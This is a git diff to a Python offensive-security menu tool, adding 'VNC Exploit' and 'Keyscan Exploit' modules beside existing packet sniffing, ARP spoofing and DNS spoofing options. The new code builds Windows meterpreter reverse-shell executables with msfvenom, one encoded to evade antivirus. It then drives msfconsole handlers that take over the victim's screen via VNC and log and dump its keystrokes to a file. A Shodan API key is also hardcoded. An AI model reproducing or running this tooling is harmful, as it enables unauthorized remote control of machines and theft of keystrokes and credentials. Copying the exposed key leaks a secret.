@@ -36,6 +36,11 @@ import lxml.etree as ET
 # from gvm.xml import pretty_print
 # from terminaltables import SingleTable, DoubleTable
 
+# Creating Directories
+
+subprocess.call("mkdir Payloads", shell=True)
+subprocess.call("mkdir Reports", shell=True)
+
 #Shodan API KEY
 Shodan_APIKEY = 'EBeU0lGqtIO6yCxVFCWC4nUVbvovtjo5'
 api = shodan.Shodan(Shodan_APIKEY)
@@ -478,7 +483,9 @@ def exploit_menu():
         print("1. Packet Sniffer")
         print("2. ARP Spoof")
         print("3. DNS Spoof")
-        print("4. Exit")
+        print("4. VNC Exploit")
+        print("5. Keyscan Exploit")
+        print("6. Exit")
         menu_input = (input("Select option: "))
         if menu_input == "1":
             ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
@@ -492,7 +499,15 @@ def exploit_menu():
             ascii_3 = pyfiglet.figlet_format("DNS Spoof")
             print(ascii_3)
             dns_spoof()
-        elif menu_input == "3":
+        elif menu_input == "4":
+            ascii_3 = pyfiglet.figlet_format("VNC Exploit")
+            print(ascii_3)
+            vnc_menu()
+        elif menu_input == "5":
+            ascii_3 = pyfiglet.figlet_format("Keyscan Exploit")
+            print(ascii_3)
+            keyscan_menu()
+        elif menu_input == "6":
             exploit_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
@@ -558,6 +573,49 @@ def openvas_menu():
             print("Invalid Input!\nPlease Try Again!")
             continue
 
+def vnc_menu():
+    vnc_loop = True
+    while vnc_loop == True:
+        print("\nPlease Select an Option Below.")
+        print("1. Generate VNC Payload")
+        print("2. Run VNC Exploit")
+        print("3. Exit")
+        menu_input = (input("Select option: "))
+        if menu_input == "1":
+            ascii_1 = pyfiglet.figlet_format("Generate VNC Payload")
+            print(ascii_1)
+            generate_vnc_payload()
+        elif menu_input == "2":
+            ascii_2 = pyfiglet.figlet_format("Run VNC Exploit")
+            print(ascii_2)
+            vnc_exploit()
+        elif menu_input == "3":
+            vnc_loop = False
+        else:
+            print("Invalid Input!\nPlease Try Again!")
+            continue
+
+def keyscan_menu():
+    keyscan_loop = True
+    while keyscan_loop == True:
+        print("\nPlease Select an Option Below.")
+        print("1. Generate Keyscan Payload")
+        print("2. Run Keyscan Exploit")
+        print("3. Exit")
+        menu_input = (input("Select option: "))
+        if menu_input == "1":
+            ascii_1 = pyfiglet.figlet_format("Generate Keyscan Payload")
+            print(ascii_1)
+            generate_keyscan_payload()
+        elif menu_input == "2":
+            ascii_2 = pyfiglet.figlet_format("Run Keyscan Exploit")
+            print(ascii_2)
+            keyscan_exploit()
+        elif menu_input == "3":
+            keyscan_loop = False
+        else:
+            print("Invalid Input!\nPlease Try Again!")
+            continue
 
 def portDiscovery():
     target = input("Enter an IP Address to scan: ")
@@ -1564,7 +1622,80 @@ def arp_spoof():
 
 
 def dns_spoof():
-    arp_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 dns-spoof.py; exec bash"'])
+    dns_spoof = subprocess.Popen(['gnome-terminal', '-e', 'bash -c "python3 dns-spoof.py; exec bash"'])
+
+def generate_vnc_payload():
+    lhost = input("IP Address of this machine: ")
+    subprocess.call("msfvenom -p windows/meterpreter/reverse_tcp \
+    --platform windows -a x86 -f exe LHOST={} LPORT=444 -o Payloads/vnc_exploit.exe".format(lhost), 
+    shell=True)
+
+def vnc_exploit():
+    # Set exploit variables
+    exploit = "exploit/multi/handler"
+    payload = "windows/meterpreter/reverse_tcp"
+    lhost = input("IP Address of this machine: ")
+    lport = "444"
+    sleep = input("How long do you want to listen for (in seconds)? ")
+    
+    # Run msfconsole in new terminal
+    process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
+    set PAYLOAD {}; \
+    set LHOST {}; \
+    set LPORT {}; \
+    exploit -j -z; \
+    sleep {}; \
+    sessions -i 1 -C \\"run vnc\\""'.format(exploit, payload, lhost, lport, sleep)])
+
+def generate_keyscan_payload():
+    lhost = input("IP Address of this machine: ")
+    subprocess.call('msfvenom -p windows/meterpreter/reverse_tcp \
+    --platform windows -a x86 -e x86/shikata_ga_nai -b "\\x00" LHOST={} -f exe > Payloads/keyscan_exploit.exe'.format(lhost), 
+    shell=True)
+    print("Saved as: Payloads/keyscan_exploit.exe")
+
+def keyscan_exploit():
+    open('keyscan.txt', 'w')
+    # Set exploit variables
+    
+    exploit = "exploit/multi/handler"
+    payload = "windows/meterpreter/reverse_tcp"
+    lhost = input("IP Address of this machine: ")
+    lport = "444"
+    listen_sleep = input("How long do you want to listen for (in seconds)? ")
+    keyscan_sleep = input("How long do you want to run the keyscan for (in seconds)? ")
+    
+    # Run msfconsole in new terminal
+    process = subprocess.Popen(['gnome-terminal', '-e', 'msfconsole -x "use {}; \
+    set PAYLOAD {}; \
+    set LHOST {}; \
+    set LPORT {}; \
+    exploit -j -z; \
+    sleep {}; \
+    sessions -i 1 -C \\"load stdapi\\"; \
+    sessions -i 1 -C \\"keyscan_start\\"; \
+    sleep {}; \
+    spool keyscan.txt; \
+    sessions -i 1 -C \\"keyscan_dump\\"; \
+    spool off"'.format(exploit, payload, lhost, lport, listen_sleep, keyscan_sleep)])
+    
+    
+    input("Press Enter once keyscan is done ")
+    # Open the text file
+    with open("keyscan.txt", "r") as file:
+        content = file.read()
+        
+    #ip_address = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', content).group()
+    #print("\nTarget Machine: ", ip_address)
+
+    # Remove color codes using regular expressions
+    clean_content = re.sub(r'\\[\d+m', '', content)
+
+    # Print the clean content
+    print(clean_content)
+    
+    with open("keyscan.txt", "w") as file:
+        file.write(clean_content)
 
 
 project_menu()
